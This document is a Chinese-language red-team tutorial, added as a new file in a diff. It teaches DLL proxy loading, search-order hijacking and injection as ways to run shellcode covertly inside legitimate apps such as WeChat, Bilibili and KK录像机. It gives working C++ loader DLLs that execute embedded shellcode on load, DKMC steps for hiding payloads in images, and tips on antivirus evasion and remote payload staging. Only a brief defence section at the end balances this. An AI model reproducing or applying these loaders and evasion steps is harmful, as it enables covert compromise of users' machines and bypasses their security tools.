@@ -1,0 +1,194 @@
+## 1. 概述
+
+在高级持续性威胁 (APT) 和红队渗透测试中，如何有效地将恶意代码（ShellCode）植入目标系统并规避终端安全产品的检测，是攻击成功的关键环节。本文档旨在深入探讨几种主流的基于 DLL 操作的 ShellCode 加载与执行技术，这些技术通过利用 Windows 系统的原生加载机制，实现对恶意代码的隐蔽部署。
+
+我们将重点分析三种核心战术：
+
+- **代理加载 (Proxy Loading)**：通过创建一个恶意的“代理”DLL，将合法的函数调用转发至原始 DLL，同时在加载过程中执行恶意 ShellCode。
+- **劫持加载 (Hijacking Loading)**：利用 Windows DLL 搜索顺序的特性，将恶意 DLL 放置在合法程序优先搜索的路径下，诱使其加载恶意 DLL 而非原始 DLL。
+- **注入加载 (Injection Loading)**：将恶意 DLL 注入到正在运行的合法进程中，借助其上下文执行恶意代码。
+
+本文将结合理论原理、环境准备、实战示例和安全总结，为读者提供一份可直接用于学习和研究的技术文档。
+
+## 2. 技术原理
+
+### 2.1 Windows DLL 搜索顺序
+
+理解 DLL 劫持和代理加载的核心在于掌握 Windows 如何定位和加载 DLL。从 Windows XP SP2 开始，当一个应用程序需要加载一个 DLL 时，系统会按照以下顺序进行搜索（在未开启 `SafeDllSearchMode` 的情况下）：
+
+1.  **程序所在目录**：可执行文件（`.exe`）自身所在的文件夹。这是最优先的搜索路径，也是 DLL 劫持最常利用的弱点。
+2.  **系统目录**：通过 `GetSystemDirectory()` 函数获取的目录，通常是 `C:\Windows\System32`。
+3.  **16位系统目录**：通常是 `C:\Windows\System`，为兼容旧版应用而存在。
+4.  **Windows 目录**：通过 `GetWindowsDirectory()` 函数获取的目录，通常是 `C:\Windows`。
+5.  **当前工作目录 (Current Directory)**：进程启动时所在的目录。
+6.  **环境变量 `PATH` 中的目录**：操作系统环境变量 `PATH` 中列出的所有目录。
+
+这种固定的搜索顺序为攻击者提供了可乘之机：如果一个应用程序尝试加载一个位于系统目录的 DLL，但攻击者在程序所在目录放置了一个同名但恶意的 DLL，那么应用程序将优先加载这个恶意的 DLL。
+
+### 2.2 白加黑 (White + Black) 思想
+
+“白加黑”是一种利用受信任的、有合法数字签名的程序（白文件）来加载恶意代码（黑文件）的攻击手法。由于白文件本身是合法的，它可以轻易绕过许多基于签名的安全检测。当这个白文件启动时，它会按照上述搜索顺序加载一个被攻击者替换或植入的恶意 DLL（黑文件），从而执行恶意载荷。这种方式极具隐蔽性，是现代免杀技术的核心思想之一。
+
+## 3. 环境与工具准备
+
+在进行实战演练之前，请确保您的研究环境已准备好以下工具：
+
+| 工具名称 | 主要用途 | 下载/参考链接 |
+| :--- | :--- | :--- |
+| **Process Monitor** | 实时监控文件系统、注册表和进程/线程活动，用于筛选目标程序加载的 DLL。 | [官方文档](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) |
+| **Dependencies** | 现代化的 PE 文件分析工具，用于查看 DLL 的导入/导出表，替代旧版的 Dependency Walker。 | [GitHub](https://github.com/lucasg/Dependencies) |
+| **Visual Studio** | 用于编译恶意 DLL 和使用其自带的 `dumpbin.exe` 工具。 | [官方网站](https://visualstudio.microsoft.com/) |
+| **DKMC (Don't Kill My Cat)** | ShellCode 生成与混淆框架，可将 ShellCode 隐藏在图片等文件中。 | [GitHub](https://github.com/Mr-Un1k0d3r/DKMC) |
+| **bDLL / ZeroEye** | 自动化挖掘可被劫持 DLL 的项目，可作为辅助分析工具。 | [bDLL](https://github.com/dragoneeg/bDLL), [ZeroEye](https://github.com/ImCoriander/ZeroEye) |
+
+**挖掘“白加黑”利用目标时的关键原则：**
+*   **优先选择依赖 DLL 较少的程序**：简化分析过程，减少不必要的干扰。
+*   **避免有弹窗交互的程序**：自动化执行时，弹窗会中断流程。
+*   **避开带有微软官方签名的核心系统程序**：这些程序通常受到更严格的系统保护（如SFC），劫持难度大且风险高。
+
+## 4. 实战示例
+
+### 案例 1：KK录像机 - 代理加载 (Proxy Loading)
+
+此案例演示如何为合法程序创建一个代理 DLL，在不破坏原程序功能的前提下执行 ShellCode。
+
+**攻击流程：**
+
+1.  **筛选目标 DLL**：
+    使用 Process Monitor 监控 `kkcapture.exe` 的启动过程，发现其加载了 `libfontconfig-1.dll`。这个 DLL 不是系统核心组件，适合作为代理目标。
+
+2.  **生成恶意代理 DLL**：
+    创建一个新的 DLL 项目，其核心思想是：
+    -   在 `DllMain` 函数的 `DLL_PROCESS_ATTACH` 事件中，启动一个新线程来执行我们的 ShellCode。
+    -   使用 `#pragma comment(linker, "/export:...")` 伪指令将所有来自原始 `libfontconfig-1.dll` 的导出函数转发出去。这样，当主程序调用这些函数时，我们的代理 DLL 会将调用请求无缝地传递给原始 DLL，保证了原程序功能的完整性。
+
+    ```cpp
+    #include "pch.h"
+    #include <windows.h>
+
+    // 假设原始DLL的导出函数为 OriginalFunction1, OriginalFunction2
+    // 实际操作中需要用工具获取所有导出函数并进行转发
+    #pragma comment(linker, "/export:OriginalFunction1=C:\\Path\\To\\Original_libfontconfig-1.OriginalFunction1,@1")
+    #pragma comment(linker, "/export:OriginalFunction2=C:\\Path\\To\\Original_libfontconfig-1.OriginalFunction2,@2")
+    // ... 更多导出函数
+
+    // 你的ShellCode
+    unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0...";
+
+    DWORD WINAPI ExecuteShellcode(LPVOID lpParam) {
+        LPVOID p = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if (p) {
+            memcpy(p, shellcode, sizeof(shellcode));
+            ((void(*)())p)();
+        }
+        return 0;
+    }
+
+    BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+        switch (ul_reason_for_call) {
+            case DLL_PROCESS_ATTACH:
+                CreateThread(NULL, 0, ExecuteShellcode, NULL, 0, NULL);
+                break;
+            case DLL_THREAD_ATTACH:
+            case DLL_THREAD_DETACH:
+            case DLL_PROCESS_DETACH:
+                break;
+        }
+        return TRUE;
+    }
+    ```
+
+3.  **部署与执行**：
+    -   将原始的 `libfontconfig-1.dll` 重命名为 `Original_libfontconfig-1.dll`（或其他你选择的名字）。
+    -   将我们编译生成的恶意代理 DLL 命名为 `libfontconfig-1.dll`。
+    -   将这两个 DLL 文件与 `kkcapture.exe` 放置在同一目录下。
+    -   运行 `kkcapture.exe`，程序正常启动，同时我们的 ShellCode 在后台被悄然执行。
+
+### 案例 2：微信 PC 客户端 - 劫持加载 (Hijacking Loading)
+
+此案例展示如何利用 DLL 搜索顺序，通过劫持一个非核心 DLL 来执行 ShellCode。
+
+**攻击流程：**
+
+1.  **筛选目标 DLL**：
+    -   启动 Process Monitor，并设置以下过滤器：
+        -   `Process Name` is `WeChat.exe`
+        -   `Result` is `SUCCESS`
+        -   `Path` ends with `.dll`
+    -   启动微信 PC 客户端，观察 Process Monitor 的输出。我们可能会发现 `WeChat.exe` 成功加载了其安装目录下的 `TaskTray.dll`。这是一个理想的劫持目标，因为它位于程序目录，优先级最高。
+
+2.  **获取 DLL 关键信息**：
+    -   使用 Visual Studio 自带的 `dumpbin.exe` 工具分析原始 `TaskTray.dll`。
+    -   **获取导出函数**：`dumpbin /exports "C:\Program Files (x86)\Tencent\WeChat\TaskTray.dll"`
+    -   **获取文件位数 (32/64位)**：`dumpbin /headers "C:\Program Files (x86)\Tencent\WeChat\TaskTray.dll"`
+    -   确保我们编译的恶意 DLL 与目标程序的位数一致，并导出了相同的函数名，以避免程序因找不到函数而崩溃。
+
+3.  **生成图片 ShellCode**：
+    -   使用 DKMC 框架生成隐藏在图片中的 ShellCode，增加隐蔽性。
+    -   启动 DKMC：`python2 dkmc.py`
+    -   在 DKMC 控制台中执行命令：
+        ```bash
+        gen
+        set shellcode \xfc\x48\x83\xe4\xf0...  # 替换为你的ShellCode
+        run
+        ```
+    -   这将生成一个包含 ShellCode 的图片文件（如 `artifact.png`）和一个用于加载的 C++ 头文件。
+
+4.  **编译并部署恶意 DLL**：
+    -   创建一个新的 DLL 项目，包含从图片中加载并执行 ShellCode 的代码。
+    -   将原始 `TaskTray.dll` 备份或重命名。
+    -   将我们编译的恶意 `TaskTray.dll` 和图片文件放置到微信的安装目录中。
+    -   启动微信，`WeChat.exe` 会加载我们的恶意 DLL，从而执行 ShellCode。
+
+### 案例 3：哔哩哔哩客户端 - 注入加载 (Injection Loading)
+
+此案例简要描述了通过 DLL 注入实现代码执行的思路。
+
+**攻击流程：**
+
+1.  **筛选目标 DLL**：
+    通过 Process Monitor 分析发现，许多应用程序在处理键盘输入时会加载 `KBDUS.DLL`（美国标准键盘布局）。这是一个系统级的 DLL，直接劫持它风险较高且可能影响系统稳定性。但我们可以利用这个加载行为。
+
+2.  **注入思路**：
+    -   与其替换文件，不如采用 DLL 注入技术。
+    -   编写一个加载器（Injector），使用 `CreateRemoteThread`、`SetWindowsHookEx` 或其他注入技术，将我们编译的恶意 DLL 强行加载到目标进程（如 `Bilibili.exe`）的内存空间中。
+    -   当 DLL 被注入后，其 `DllMain` 函数会被调用，从而执行我们预设的 ShellCode。
+
+3.  **编译恶意 DLL**：
+    -   恶意 DLL 的结构非常简单，只需在 `DllMain` 的 `DLL_PROCESS_ATTACH` 中包含执行 ShellCode 的逻辑即可。
+
+    ```cpp
+    #include <windows.h>
+
+    // ShellCode
+    unsigned char shellcode[] = "\xfc\x48...";
+
+    BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+        if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
+            // 在这里执行ShellCode的逻辑
+            LPVOID p = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            memcpy(p, shellcode, sizeof(shellcode));
+            ((void(*)())p)();
+        }
+        return TRUE;
+    }
+    ```
+
+## 5. 关键细节与补充
+
+- **导出函数转发**：在进行代理加载时，必须确保所有原始导出函数都被正确转发。可以使用工具自动化提取导出函数列表并生成 `#pragma` 伪指令，避免手动操作的遗漏和错误。
+- **位数匹配**：恶意 DLL 的位数（32位或64位）必须与目标白程序的位数严格匹配，否则加载会失败。
+- **ShellCode 加载器**：为了提高免杀效果，不应将 ShellCode 硬编码在 DLL 中。可以采用多种分离加载技术，如从远程服务器下载、从图片/文档等文件中提取、或通过加密存储在资源节中，在运行时再解密执行。
+- **环境清理**：在劫持加载后，如果希望恢复程序功能或避免留下痕迹，恶意 DLL 在执行完 ShellCode 后，可以动态加载原始的 DLL（已重命名），并将函数调用转发过去。
+
+## 6. 安全总结与防御建议
+
+DLL 操作是免杀对抗中经久不衰的技术，其核心是利用了操作系统设计上的信任机制。从防御者的角度来看，可以采取以下措施来缓解此类威胁：
+
+- **启用安全 DLL 搜索模式 (`SafeDllSearchMode`)**：这是 Windows 默认开启的功能，它会调整 DLL 搜索顺序，将系统目录的优先级置于当前工作目录之上，能在一定程度上缓解部分劫持场景。
+- **应用程序控制 (Application Whitelisting)**：通过 AppLocker 或其他第三方工具，严格限制允许加载的 DLL，只信任已知和合法的模块。
+- **监控异常 DLL 加载行为**：终端检测与响应 (EDR) 系统可以监控进程加载不在其安装目录或系统目录下的 DLL 的行为，并将其作为可疑事件进行告警。
+- **开发者侧加固**：程序开发者应在代码中指定 DLL 的绝对路径进行加载，或使用 `SetDllDirectory` 函数临时移除当前目录的搜索优先级，从根本上杜绝此类劫持。
+- **文件完整性监控**：监控受信任应用程序目录下的文件变更，特别是 DLL 文件的创建和修改，有助于及时发现劫持企图。
+
+---
